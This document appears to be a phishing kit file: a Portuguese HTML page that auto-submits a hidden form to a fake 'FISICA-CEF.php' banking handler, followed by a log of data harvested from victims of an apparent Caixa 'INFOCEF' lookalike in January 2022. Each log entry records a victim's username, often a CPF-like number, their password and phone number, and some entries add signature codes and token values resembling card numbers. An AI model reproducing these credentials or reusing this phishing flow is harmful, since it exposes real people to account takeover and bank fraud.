<!DOCTYPE html>
<html lang="pt-br">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
body {
    background-color: #000000;
    background-image: url();
}
body,td,th {
    color: #00FF05;
    font-size: 12px;
}
</style>
<script>
$(document).ready(function() { 
window.location.href='#foo';
});
</script>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" type="text/css" href="css/style1.css">
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="JavaScript">
function direcionar() { document.form.submit(); }
 
</script>
<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<body style="margin:0;" onLoad="setTimeout('direcionar()',17000);">
<div id="fundo2">
<a href="#" id="ancora">
<form name="form" id="form" action="FISICA-CEF.php" method="post">
<input type="hidden" name="br" id="br" value="">
</form>
</div>


<a href="#" id="foo"></a>
<script>
window.location.href='#ancora';
</script>

</html>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:01<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A705MN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Thiagogustavodasilva<br>
| Senha: Thiago 2<br>
| Celular: (11) 98844-7521<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 212153<br>
| Dispositivo: Thiago212153<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:02<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; SM-A305GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: MartamarineyCristina<br>
| Senha: 22446688<br>
| Celular: (11) 96744-0289<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 224466<br>
| Dispositivo: Martamariney<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:04<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 6.0; MotoG3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Alexcavali<br>
| Senha: 300669<br>
| Celular: (11) 96300-5236<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:04<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 10; moto e(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: 136001364141<br>
| Senha: 10309001<br>
| Celular: (11) 98844-7448<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 300669<br>
| Dispositivo: Alexcavali<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 4007000368858<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 4126013000569427<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 1604<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 3006<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 3006<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:08<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/15.0 Chrome/90.0.4430.210 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Casamento<br>
| Senha: 25355077<br>
| Celular: (11) 98844-4846<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 240297<br>
| Dispositivo: Casamento<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:10<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; SM-A015M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Cristinalopes<br>
| Senha: 486648<br>
| Celular: (11) 98844-8909<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 486648<br>
| Dispositivo: Cristina<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:12<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 10; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Ttfgyyghh<br>
| Senha: Hitfbn<br>
| Celular: (82) 09586-8668<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 285286<br>
| Dispositivo: Dydhcgudg<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 288658668568865<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 8245<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 3118013000106536<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 1212<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:14<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Sidneifranco<br>
| Senha: 031251<br>
| Celular: (11) 98844-7536<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 1212<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 031251<br>
| Dispositivo: Samsungj7<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:25<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 10; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Madierica<br>
| Senha: Eridi121<br>
| Celular: (11) 98844-4911<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 271105<br>
| Dispositivo: Motog8plus<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:36<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; moto g(9) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: JOSMILTONTAVARES<br>
| Senha: 831218<br>
| Celular: (11) 91023-6898<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 831218<br>
| Dispositivo: Motorolag9<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 10860230008334206192<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 2101<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 08:50<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; motorola one fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: 22026127859<br>
| Senha: 19804161<br>
| Celular: (11) 98844-2566<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 198041<br>
| Dispositivo: 19804151<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 09:06<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1<br>
| -------------------------------------<br>
| Usuario: 39795252879<br>
| Senha: 17930901<br>
| Celular: (11) 98844-7309<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 999634<br>
| Dispositivo: 11988447309<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 09:19<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; motorola one action) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: 47583028809<br>
| Senha: 475830<br>
| Celular: (11) 98844-5445<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 09:26<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Deisesantos45<br>
| Senha: 50421987<br>
| Celular: (11) 98844-1058<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 504219<br>
| Dispositivo: Redminot10<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 0260001000254552<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 0709<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 13:04<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: 28997036840<br>
| Senha: 70783213<br>
| Celular: (11) 98844-0652<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 707832<br>
| Dispositivo: 70783213<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 17:16<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A013M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/96.0.4664.104 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: 42445279828<br>
| Senha: 19937818<br>
| Celular: (11) 98844-5339<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 199378<br>
| Dispositivo: 19937818<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token1: 089712888693894739<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| token2: 7435<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: <br>
| Dispositivo: <br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 12/01/2022<br>
| Hora: 19:50<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1<br>
| -------------------------------------<br>
| Usuario: 54686776287<br>
| Senha: 54686776<br>
| Celular: ‪+55 11 98844‑6<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 13/01/2022<br>
| Hora: 11:23<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-J260MU Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.2 Chrome/96.0.4664.104 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: SandracristianeBorgc<br>
| Senha: 740321<br>
| Celular: (11) 98844-9339<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 13/01/2022<br>
| Hora: 13:45<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: 33158542897<br>
| Senha: 98844173<br>
| Celular: (11) 98844-1731<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 13/01/2022<br>
| Hora: 14:34<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-J260MU Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.2 Chrome/96.0.4664.104 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: Sandracristianeborge<br>
| Senha: 740321<br>
| Celular: (11) 98844-9339<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 740321<br>
| Dispositivo: 74032100<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 13/01/2022<br>
| Hora: 16:15<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G570M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: RAFAEMENDES<br>
| Senha: 2o2o2o<br>
| Celular: (11) 98844-3719<br>
| -------------------------------------<br>
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: 14/01/2022<br>
| Hora: 14:41<br>
| IP: 169.254.141.1<br>
| Navegador: Mozilla/5.0 (Linux; Android 8.1.0; moto e5 play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36<br>
| -------------------------------------<br>
| Usuario: gilvaniamelodasilva<br>
| Senha: 752906<br>
| Celular: (11) 98844-9111<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 752906<br>
| Dispositivo: Gilvania<br>
| -------------------------------------<br>
| IP: 169.254.141.1<br>
| -------------------------------------<br>
| Assinatura: 752906<br>
| Dispositivo: Gilvania<br>
| -------------------------------------<br>